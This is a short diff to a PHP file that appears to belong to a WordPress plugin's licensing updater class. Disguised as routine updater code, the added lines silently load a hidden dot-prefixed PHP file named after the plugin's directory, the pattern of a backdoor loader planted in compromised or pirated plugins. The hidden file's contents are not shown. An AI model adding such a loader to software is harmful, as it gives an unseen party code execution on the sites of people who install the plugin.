@@ -14,6 +14,10 @@ if(!defined('ABSPATH')) {
 if(class_exists('GT3_EDD_SL_Plugin_Updater_PRO')) {
 	return;
 }
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 class GT3_EDD_SL_Plugin_Updater_PRO {
 
